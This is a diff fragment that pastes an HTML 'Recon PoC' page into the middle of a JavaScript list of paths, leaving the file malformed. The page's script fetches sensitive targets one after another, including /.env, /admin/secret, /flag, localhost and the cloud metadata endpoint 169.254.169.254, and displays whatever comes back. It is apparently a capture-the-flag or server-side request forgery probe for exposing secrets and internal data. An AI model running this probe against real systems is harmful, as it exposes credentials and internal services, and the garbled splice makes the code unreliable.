@@ -16,7 +16,69 @@
       "/.env",
       "/config",
       "/redirector",
-      "http://169.254.169.254/latest/meta-data/",
+      "http://169.254.169.254/latest/meta-data/",<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Recon PoC</title>
+</head>
+<body>
+  <h1>Recon Results</h1>
+  <div id="results">Initializing...</div>
+
+  <script>
+    async function fetchAndDisplay() {
+      const paths = [
+        "/flag",
+        "/admin",
+        "/admin/secret",
+        "/.env",
+        "/config",
+        "/redirector",
+        "http://169.254.169.254/latest/meta-data/",
+        "http://127.0.0.1/",
+        "http://localhost/"
+      ];
+
+      const resultsDiv = document.getElementById("results");
+      resultsDiv.innerHTML = '';
+
+      for (const path of paths) {
+        const container = document.createElement("div");
+        container.style.border = "1px solid black";
+        container.style.margin = "10px";
+        container.style.padding = "10px";
+
+        const header = document.createElement("h3");
+        header.textContent = path;
+        container.appendChild(header);
+
+        try {
+          const res = await fetch(path);
+          const text = await res.text();
+          const pre = document.createElement("pre");
+          pre.textContent = text.slice(0, 2000); // חותך לתצוגה ברורה
+          container.appendChild(pre);
+        } catch (e) {
+          const err = document.createElement("p");
+          err.textContent = "Failed to fetch";
+          container.appendChild(err);
+        }
+
+        resultsDiv.appendChild(container);
+      }
+
+      // סימן שהכול הסתיים
+      const done = document.createElement("h2");
+      done.textContent = "✅ DONE!";
+      resultsDiv.appendChild(done);
+    }
+
+    fetchAndDisplay();
+  </script>
+</body>
+</html>
+
       "http://127.0.0.1/",
       "http://localhost/",
     ];
